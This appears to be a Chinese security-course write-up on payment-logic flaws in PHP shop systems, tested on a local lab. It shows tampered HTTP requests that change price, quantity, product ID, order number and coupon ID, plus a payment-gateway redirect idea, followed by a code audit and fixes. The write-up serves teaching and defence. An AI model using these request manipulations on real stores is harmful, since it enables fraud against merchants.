![1648252814928-cff5f0ec-ad5f-405a-9bc6-b7ee2e801f8d.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133208907-1097950715.png)

```plain
#知识点：
1、商品购买-数量&价格&编号等
2、支付模式-状态&接口&负数等
3、折扣处理-优惠券&积分&重放等

#详细点：
1、熟悉常见支付流程
选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付
2、熟悉那些数据篡改
商品编号ID，购买价格，购买数量，支付方式，订单号，支付状态等    数量能不能修改，价格能不能修改，编号能不能修改。怎么判定支付成功还是支付失败（能不能修改），支付接口能不能被篡改
3、熟悉那些修改方式
替换支付（用3000支付6000的东西），重复支付（支付完成，把支付流程数据包重新走一遍），最小额支付，负数支付，溢出支付，优惠券支付等

#章节内容：
1、权限相关-越权&访问控制&未授权访问等
2、购买支付-数据篡改&支付模式&其他折扣等
3、下节课
4、下节课
```

- 数据篡改-价格&数量&产品

```plain
1、修改数量达到价格变动
2、修改单价达到价格变动
3、修改产品达到低价购买
4、修改接口达到成功购买
```

价格

```plain
访问：http://127.0.0.1:8117/index.php?s=/articles/127.html

点击购买抓包：（大米测试产品6000）
```

![1648259232208-7a894eff-8981-4fcc-a7c3-7a613db8083a.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133224883-1155118600.png)

```plain
购买6000的数据包：
GET /index.php?m=Member&a=gobuy&iscart=0&id=127&name=%E5%A4%A7%E7%B1%B3%E6%B5%8B%E8%AF%95%E4%BA%A7%E5%93%81&qty=1&price=6000&gtype=%E7%81%B0%E8%89%B2&pic=/Public/Uploads/thumb/thumb_1393218295.jpg HTTP/1.1
正常放出的话，他就会跳到6000块钱支付单价上。


修改price=6000看看能不能对价格进行修改。
GET /index.php?m=Member&a=gobuy&iscart=0&id=127&name=%E5%A4%A7%E7%B1%B3%E6%B5%8B%E8%AF%95%E4%BA%A7%E5%93%81&qty=1&price=6&gtype=%E7%81%B0%E8%89%B2&pic=/Public/Uploads/thumb/thumb_1393218295.jpg HTTP/1.1
放出数据包
```

![1648259148149-546766af-0e60-419c-ba15-31266ac13311.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133223270-443858107.png)

```plain
这样就对价格进行了修改，从而用6块钱买到了6000块钱的东西
产生这个漏洞是因为这个6000价格不是固定的。最终判定金额的大小的时候，是由你的数据包的值为准，从而导致金额的篡改。
```

数量

```plain
http://127.0.0.1:8117/index.php?s=/articles/127.html

抓取数据包
```

![1648259439095-f030e4a5-583c-4f5b-81d7-ba77298544de.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133223518-1231262049.png)

```plain
购买产品数量为1的数据包：
GET /index.php?m=Member&a=gobuy&iscart=0&id=127&name=%E5%A4%A7%E7%B1%B3%E6%B5%8B%E8%AF%95%E4%BA%A7%E5%93%81&qty=1&price=6000&gtype=%E7%81%B0%E8%89%B2&pic=/Public/Uploads/thumb/thumb_1393218295.jpg HTTP/1.1

把qty的值进行修改
GET /index.php?m=Member&a=gobuy&iscart=0&id=127&name=%E5%A4%A7%E7%B1%B3%E6%B5%8B%E8%AF%95%E4%BA%A7%E5%93%81&qty=-1&price=6000&gtype=%E7%81%B0%E8%89%B2&pic=/Public/Uploads/thumb/thumb_1393218295.jpg HTTP/1.1
```

![1648259523259-94b42a1b-9546-4598-98d4-1596a1faa78f.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133224970-2033695519.png)

产品

```plain
购买大米测试产品（6000）

数据包的值：
GET /index.php?m=Member&a=gobuy&iscart=0&id=127&name=%E5%A4%A7%E7%B1%B3%E6%B5%8B%E8%AF%95%E4%BA%A7%E5%93%81&qty=1&price=6000&gtype=%E7%81%B0%E8%89%B2&pic=/Public/Uploads/thumb/thumb_1393218295.jpg HTTP/1.1


购买小米cms（5400）

数据包的值：
GET /index.php?m=Member&a=gobuy&iscart=0&id=70&name=%E5%A4%A7%E7%B1%B3%E6%89%8B%E6%9C%BACMS&qty=1&price=5400&gtype=%E7%81%B0%E8%89%B2&pic=/Public/Uploads/thumb/thumb_1393218295.jpg HTTP/1.1

我们想以5400的价格去购买6000的东西，该怎么修改他呢？
拿6000数据包：不修改价格和数量，其他都修改。
/index.php?m=Member&a=gobuy&iscart=0&id=127&name=%E5%A4%A7%E7%B1%B3%E6%B5%8B%E8%AF%95%E4%BA%A7%E5%93%81&
&gtype=%E7%81%B0%E8%89%B2&pic=/Public/Uploads/thumb/thumb_1393218295.jpg

对5400的数据包进行替换：
GET /index.php?m=Member&a=gobuy&iscart=0&id=127&name=%E5%A4%A7%E7%B1%B3%E6%B5%8B%E8%AF%95%E4%BA%A7%E5%93%81&qty=1&price=5400&gtype=%E7%81%B0%E8%89%B2&pic=/Public/Uploads/thumb/thumb_1393218295.jpg HTTP/1.1
```

![1648260063380-8ca636ef-f31a-424d-9bcf-ff61eb68ffe5.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133224003-1753331980.png)

```plain
放出数据包，实现了5400的价格购买了大米测试产品（6000）
```

![1648260121980-30bcc790-977c-4ec3-adf9-4f59c112ed56.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133224885-479446811.png)

- 修改方式-订单号&数量&优惠券

```plain
1、修改数量达到价格变动
2、修改订单达到底价购买
3、优惠券重放使用&重领使用
```

支付接口

```plain
点击购买

抓取数据包：
ET /gateway.do?_input_charset=utf-8&logistics_fee=0.00&logistics_payment=SELLER_PAY&logistics_type=EXPRESS&notify_url=http%3A%2F%2Fwww.myweb.com%2Findex.php%2FPublic%2Fshouquan&out_trade_no=GB1648267817-9&partner=2088002530455064&payment_type=1&price=5400&quantity=1&receive_address=afnaeoifadkokanf&receive_mobile=15363908147&receive_name=111&return_url=http%3A%2F%2Fwww.myweb.com%2FTrade%2Fap_danbao%2Freturn_url.php&seller_email=admin%40126.com&service=create_partner_trade_by_buyer&show_url=http%3A%2F%2Fwww.damicms.com%2FPublic%2Fdonate&subject=%E5%A4%A7%E7%B1%B3%E6%89%8B%E6%9C%BACMS&sign=d01de4eabc8e913c04e9782679fbc988&sign_type=MD5 HTTP/1.1

可以尝试修改这个接口的数据包，从而达成这个支付接口转到你那里，就是你收到了钱，这样相当于没有付款就能够完成。类似于重定向，相当于收款方发生了改变。
```

![1648268026870-6828a1d1-e008-401e-bbd1-b02d629c86ca.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133224015-1552007953.png)

订单号

```plain
差不多到付款的时候，抓取数据包
```

![1648272076379-5b60129c-ada6-45c6-8d5c-9a2e2f7b6c34.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133224000-150598243.png)

```plain
出现订单编号：/index.php?s=/wap/pay/getpayvalue&out_trade_no=1648272697757（1000块钱的订单编号）

再次购买10个数据包，抓取，订单编号：/index.php?s=/wap/pay/getpayvalue&out_trade_no=1648272342449

1000数据包：/index.php?s=/wap/pay/getpayvalue&out_trade_no=1648272697757
/index.php?s=/wap/pay/wchatpay&no=1648272697757
10000数据包：/index.php?s=/wap/pay/getpayvalue&out_trade_no=1648272842264
/index.php?s=/wap/pay/wchatpay&no=1648272842264

这个时候，想用1000的数据包来支付10000的东西
点1000的东西，去支付
```

![1648273115173-6304a8e9-cc87-4ecc-a6e5-8bcf8a900cb7.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133224945-587307717.png)

```plain
记录一下编号：
/index.php?s=/order/orderPay&id=12

付款订单编号：
/index.php?s=/wap/pay/getpayvalue&out_trade_no=1648273201769

把这个数值篡改为刚刚的10000的付款订单/index.php?s=/wap/pay/getpayvalue&out_trade_no=1648272842264
他变成了10000付款，相当于从1000的订单点过来，付款10000的数据包。

同理，在10000这里点过去，把订单编号变成1000，他也变成了1000付款（但是没有成功，应该是有过滤了。）

1000订单去购买10000订单 最终价格10000 订单为1000
会出现两种情况：
10000订单去购买1000订单 最终价格1000 订单为10000
10000订单去购买1000订单 最终价格1000 订单为1000

有没有安全问题应该是看最终付款的商品价格。解决这个问题很简单，在购买的时候有一个id=12，在购买10000的商品的时候id=13

id编号对应了金额。

12对应1000
13对应10000
如果对应不上，则就发生错误，进行了过滤。
```

数量

```plain
访问：http://127.0.0.1:8116/index.php?s=/goods/goodsinfo&goodsid=1

点击购买，抓包
```

![1648268380092-47663ced-b395-4d95-a21f-51cc3a59f776.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133224318-381860647.png)

```plain
发现数据包中tag=buy_now&sku_id=1&num=10，但是在这个数据包中没有发现这个价格。应该是价格固定的。
但是这里有数量，可以阐释修改tag=buy_now&sku_id=1&num=0.000010
放出数据包。
```

![1648268646950-6e11e4bb-1d9c-4cb9-953d-6a770cfc03f7.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133224110-710969202.png)

优惠券

```plain
使用优惠券，抓包
goods_sku_list=1%3A1&leavemessage=&use_coupon=3&integral=0&account_balance=0&pay_type=0&buyer_invoice=&pick_up_id=0&express_company_id=1
```

![1648270305957-96ef7463-52ad-4f25-a259-6422717f2b6f.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133225522-529557888.png)

```plain
没有使用优惠券，抓包
goods_sku_list=1%3A1&leavemessage=&use_coupon=0&integral=0&account_balance=0&pay_type=0&buyer_invoice=&pick_up_id=0&express_company_id=1
```

![1648270460309-f0d56f9b-b73d-4c2a-84ab-6aaefaa5be6d.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133225174-1964187695.png)

```plain
对比两个数据包的值：
使用：goods_sku_list=1%3A1&leavemessage=&use_coupon=3&integral=0&account_balance=0&pay_type=0&buyer_invoice=&pick_up_id=0&express_company_id=1
不使用：goods_sku_list=1%3A1&leavemessage=&use_coupon=0&integral=0&account_balance=0&pay_type=0&buyer_invoice=&pick_up_id=0&express_company_id=1

use_coupon这个值是不同的。

优惠券 
		只能领取一次
    重复使用-重放数据包
    
暂定认为这个优惠券是有个编号的，再次领取优惠券进行购买查看一下数据包

goods_sku_list=1%3A1&leavemessage=&use_coupon=4&integral=0&account_balance=0&pay_type=0&buyer_invoice=&pick_up_id=0&express_company_id=1
这个时候的use_coupon=4，所以这个use_coupon的值来判断优惠券	

那么是不是可以尝试不使用优惠券，把use_coupon这个值修改，也可以达到享受优惠券这个效果呢？

抓取未使用优惠券的数据包，进行修改：

goods_sku_list=1%3A1&leavemessage=&use_coupon=10&integral=0&account_balance=0&pay_type=0&buyer_invoice=&pick_up_id=0&express_company_id=1
放出数据包，得到800的价格。
```

![1648271175618-763e378e-03a3-4e6f-aebf-3a521081194b.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133224821-1878511801.png)

```plain
能不能再次使用这个优惠券，抓包
goods_sku_list=1%3A1&leavemessage=&use_coupon=10&integral=0&account_balance=0&pay_type=0&buyer_invoice=&pick_up_id=0&express_company_id=1
修改，重放，还是能使用这张优惠券

修复：把优惠券加密，或者存放在数据库中，加密放在别的地方，让别人猜。
```

- 某实例-演示站交易支付逻辑安全

```plain
guarantee1


__token__=a7146a632a21b04459f29d6717970f5a&id=11&title=%E6%88%BF%E5%9C%B0%E4%BA%A7%E7%BD%91%E7%AB%99%EF%BC%8C%E6%9D%836%E7%AB%99+%E5%A4%9A%E5%B9%B4%E8%80%81%E7%AB%99+%E7%9B%AE%E5%89%8DIP1.6%E4%B8%87+%E6%97%A5%E6%94%B6%E5%BD%9510w%2B&id_type=1&username=admin&price=6000.00&fee_type=1&buyer_pay=6180&seller_get=6000
修改price就可以得到。




qilecms.com


关了。
```

- 代码审计-业务支付逻辑&安全修复

```plain
1、金额以数据库定义为准
2、购买数量限制为正整数
3、优惠券固定使用后删除
4、订单生成后检测对应值
```

价格分析

```plain
damicms(可更改)
访问，抓包：http://127.0.0.1:8117/index.php?s=/articles/70.html

GET /index.php?m=Member&a=gobuy&iscart=0&id=70&name=%E5%A4%A7%E7%B1%B3%E6%89%8B%E6%9C%BACMS&qty=1&price=5400&gtype=%E7%81%B0%E8%89%B2&pic=/Public/Uploads/thumb/thumb_1393218295.jpg HTTP/1.1

找到相对应的文件web\Lib\Action\MenberAction.class.php
```

![1648280490649-5475abdc-75a6-42a8-9a1e-97ab49a3a372.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133224605-929942126.png)

```plain
nunstop(不可更改)
访问，抓包http://127.0.0.1:8116/index.php?s=/member/paymentorder

POST /index.php?s=/member/ordercreatesession HTTP/1.1
tag=buy_now&sku_id=1&num=1

找到相对应的文件：application\shop\controller\Member.php下的ordercreatesession方法
```

![1648280767384-fa500e07-9cf4-427f-88c8-98ea9bafb08b.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133225102-2047753092.png)

```plain
接受了$_SESSION['order_tag'] = 'buy_now';
$_SESSION['order_sku_list'] = $_POST['sku_id'] . ':' . $_POST['num'];
在这里没有接受价格等信息。

重新抓取数据包，看这个价格是从哪里来的，触发地址
/index.php?s=/member/paymentorder
/index.php?s=/components/getlogininfo
/index.php?s=/components/platformadvlist 

说明这三个数据包里面出现价格的换算。
application\shop\controller\Member发现价格换算
```

![1648281313485-88955bb9-7024-46ad-a562-07bb347f0abd.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133225305-175609577.png)

```plain
查看是哪个表$goods_sku_list
在goods表中看到了价格信息
```

![1648281490929-b119cc7e-2496-4afc-ad0a-c30b506f05c0.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133224805-593684909.png)

```plain
这个就是通过数据库的查询来获取价格。
```

数量

```plain
更改数量就是简单的把数量进行限制，限制他为正整数，这样就可以完美过滤。

在这里接受中没有进行过滤
$_SESSION['order_tag'] = 'buy_now';
$_SESSION['order_sku_list'] = $_POST['sku_id'] . ':' . $_POST['num'];
```

优惠券

```plain
优惠券数据包：

触发地址：
/index.php?s=/order/ordercreate
goods_sku_list=1%3A1&leavemessage=&use_coupon=4&integral=0&account_balance=0&pay_type=0&buyer_invoice=&pick_up_id=0&express_company_id=1

找到对应的文件代码段：application\shop\controller\Order.php下的ordercreate方法

代码： $use_coupon = request()->post('use_coupon', 0); // 优惠券
```

![1648282126662-a68a9007-d498-43c6-8de5-8de471c619d9.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133225300-893797025.png)

```plain
继续跟踪（搜索use_coupon）： $order_id = $order->orderCreate('1', $out_trade_no, $pay_type, $shipping_type, '1', 1, $leavemessage, $buyer_invoice, $shipping_time, $address['mobile'], $address['province'], $address['city'], $address['district'], $address['address'], $address['zip_code'], $address['consigner'], $integral, $use_coupon, 0, $goods_sku_list, $user_money, $pick_up_id, $express_company_id);
```

![1648282600869-db26484d-6621-4745-8bc7-a34841004b03.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133225197-1941718530.png)

```plain
看领取优惠券是什么一个情况
数据包：
/index.php?s=/goods/receiveGoodsCoupon
coupon_type_id=2
找到相对应的文件
```

![1648282600869-db26484d-6621-4745-8bc7-a34841004b03.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133225272-1143394395.png)

```plain
跟踪一下memberGetCoupon这个函数
```

![1648283114722-44afcaa2-0775-4a94-9413-e4a0bdbd9912.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133225276-1275626692.png)

```plain
这个就是判断这个coupon_type_id值是不是等于2，如果等于2就可以优惠券
```

订单对应值

```plain
生成订单，在数据库就会生成唯一绑定值。
```